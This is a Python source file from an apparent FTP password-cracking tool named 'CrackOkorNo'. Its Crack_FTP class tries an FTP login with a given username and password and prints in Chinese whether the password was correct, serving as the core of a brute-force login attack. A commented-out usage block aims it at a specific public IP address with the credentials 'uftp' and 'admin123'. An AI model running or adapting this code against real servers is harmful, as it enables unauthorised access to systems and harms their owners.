import CrackOkorNo.Server.Crack_Server
import ftplib


class Crack_FTP(CrackOkorNo.Server.Crack_Server.Crack_Server):
    def __init__(self, ip, port, user, password):
        super().__init__(ip=ip, port=port, user=user, password=password)

    def CrackPassword(self):  # return true or false
        try:
            myftp = ftplib.FTP(self.ip)
            myftp.login(self.user, self.password)
            print("密码正确", self.user, self.password)
            return True
        except:
            print("密码错误", self.user, self.password)
            return False

'''
host="47.93.29.25"
user="uftp"
password="admin123"
port=21
myftp=Crack_FTP(host,port,user,password)
myftp.CrackPassword()
'''